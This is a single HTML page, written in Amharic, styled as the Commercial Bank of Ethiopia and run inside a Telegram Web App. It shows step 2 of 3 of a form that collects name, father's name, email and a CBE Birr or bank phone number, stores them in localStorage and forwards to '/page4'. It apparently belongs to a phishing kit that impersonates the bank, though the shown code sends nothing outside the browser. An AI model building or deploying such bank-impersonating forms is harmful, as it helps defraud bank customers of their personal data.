<!DOCTYPE html>
<html lang="am">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>የኢትዮጵያ ንግድ ባንክ - የግል መረጃ</title>
    <script src="https://telegram.org/js/telegram-web-app.js"></script>

    <style>
        :root {
            --cbe-purple: #51255e;
            --cbe-hover: #3d1b46;
            --bg-color: #ffffff;
            --card-bg: #ffffff;
            --text-main: #111111;
            --text-muted: #666666;
            --border-color: #dddddd;
            --btn-gray: #f2f2f2;
        }

        * { box-sizing: border-box; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; }
        body { background-color: var(--bg-color); margin: 0; padding: 0; display: flex; flex-direction: column; align-items: center; min-height: 100vh; }

        .app-header {
            width: 100%; background-color: #ffffff; border-bottom: 1px solid var(--border-color);
            height: 60px; padding: 0 20px; display: flex; align-items: center; justify-content: space-between; position: sticky; top: 0; z-index: 100;
        }
        .back-btn-top { color: var(--cbe-purple); text-decoration: none; font-weight: 700; font-size: 14px; cursor: pointer; }
        .header-title { font-size: 18px; font-weight: 800; color: var(--cbe-purple); }

        .card {
            background: white; width: 90%; max-width: 440px; margin: 20px 0 30px; padding: 30px 24px;
            border-radius: 16px; border: 1px solid var(--border-color); display: flex; flex-direction: column;
        }

        .main-title { font-size: 24px; color: var(--text-main); margin: 0 0 6px; text-align: center; font-weight: 800; }
        .subtext { font-size: 13.5px; color: var(--text-muted); text-align: center; margin-bottom: 20px; }

        .step-indicator { display: flex; gap: 8px; margin: 0 auto 28px; width: 80%; }
        .step-bar { flex: 1; height: 4px; background-color: #e2e8f0; border-radius: 2px; }
        .step-bar.active { background-color: var(--cbe-purple); }

        .form-group { margin-bottom: 20px; display: flex; flex-direction: column; }
        .form-group label { font-size: 14px; font-weight: 700; color: #222; margin-bottom: 8px; }

        .form-control {
            font-size: 14px; padding: 14px 16px; border: 1px solid var(--border-color);
            border-radius: 10px; background-color: #fff; color: #333; outline: none; width: 100%;
        }
        .form-control:focus { border-color: var(--cbe-purple); }

        .phone-group { display: flex; gap: 10px; }
        .country-prefix {
            display: flex; align-items: center; justify-content: center; gap: 6px;
            background-color: #f8f8f8; border: 1px solid var(--border-color); border-radius: 10px;
            padding: 0 14px; font-weight: 700; font-size: 14px; color: #111;
        }

        .btn-container { display: flex; flex-direction: column; gap: 10px; margin-top: 15px; }
        .btn-prev { background-color: var(--btn-gray); color: #444; border: none; width: 100%; padding: 14px; border-radius: 10px; font-size: 14px; font-weight: 700; cursor: pointer; text-transform: uppercase; }
        .btn-next { background-color: var(--cbe-purple); color: white; border: none; width: 100%; padding: 14px; border-radius: 10px; font-size: 14px; font-weight: 800; cursor: pointer; text-transform: uppercase; }

        .footer-banner { width: 100%; text-align: center; padding: 20px; font-size: 12px; color: #666; margin-top: auto; border-top: 1px solid var(--border-color); }
    </style>
</head>
<body>

<div class="app-header">
    <a onclick="window.location.href='/page2'" class="back-btn-top">← ተመለስ</a>
    <div class="header-title">የኢትዮጵያ ንግድ ባንክ</div>
    <div style="width: 30px;"></div>
</div>

<div class="card">
    <h1 class="main-title">የግል መረጃ</h1>
    <div class="subtext">ደረጃ 2 ከ 3</div>

    <div class="step-indicator">
        <div class="step-bar active"></div>
        <div class="step-bar active"></div>
        <div class="step-bar"></div>
    </div>

    <form id="step2Form" onsubmit="goNext(event)">
        <div class="form-group">
            <label for="firstName">ስም</label>
            <input type="text" id="firstName" class="form-control" placeholder="አበበ" required>
        </div>

        <div class="form-group">
            <label for="lastName">የአባት ስም</label>
            <input type="text" id="lastName" class="form-control" placeholder="በየነ" required>
        </div>

        <div class="form-group">
            <label for="email">ኢሜይል አድራሻ</label>
            <input type="email" id="email" class="form-control" placeholder="abebe.beyene@gmail.com" required>
        </div>

        <div class="form-group">
            <label for="phone">የሞባይል ስልክ ቁጥር (CBE Birr / Bank)</label>
            <div class="phone-group">
                <div class="country-prefix">
                    <span>🇪🇹</span>
                    <span>+251</span>
                </div>
                <input type="tel" id="phone" class="form-control" placeholder="911234567" maxlength="9" pattern="[97][0-9]{8}" required>
            </div>
            <div style="font-size: 11.5px; color: #666; margin-top: 6px;">በ 9 ወይም በ 7 የሚጀምር 9 አሃዝ ቁጥር ያስገቡ</div>
        </div>

        <div class="btn-container">
            <button type="button" class="btn-prev" onclick="window.location.href='/page2'">ቀድመው ወደነበሩበት</button>
            <button type="submit" class="btn-next">ቀጣይ ደረጃ</button>
        </div>
    </form>
</div>

<div class="footer-banner">© 2026 የኢትዮጵያ ንግድ ባንክ</div>

<script>
    window.onload = () => {
        if (window.Telegram?.WebApp) {
            window.Telegram.WebApp.ready();
            window.Telegram.WebApp.expand();
        }
        if (localStorage.getItem('firstName')) document.getElementById('firstName').value = localStorage.getItem('firstName');
        if (localStorage.getItem('lastName')) document.getElementById('lastName').value = localStorage.getItem('lastName');
        if (localStorage.getItem('email')) document.getElementById('email').value = localStorage.getItem('email');
        if (localStorage.getItem('phone')) document.getElementById('phone').value = localStorage.getItem('phone');
    };

    function goNext(event) {
        event.preventDefault();
        const fName = document.getElementById('firstName').value.trim();
        const lName = document.getElementById('lastName').value.trim();
        const email = document.getElementById('email').value.trim();
        const phone = document.getElementById('phone').value.trim();

        if (!/^([97]\d{8})$/.test(phone)) {
            alert("እባክዎ ትክክለኛ የኢትዮጵያ ስልክ ቁጥር ያስገቡ (በ 9 ወይም 7 የሚጀምር 9 አሃዝ)።");
            return;
        }

        localStorage.setItem('firstName', fName);
        localStorage.setItem('lastName', lName);
        localStorage.setItem('email', email);
        localStorage.setItem('phone', phone);
        localStorage.setItem('userPhone', phone);

        window.location.href = "/page4";
    }
</script>

</body>
</html>
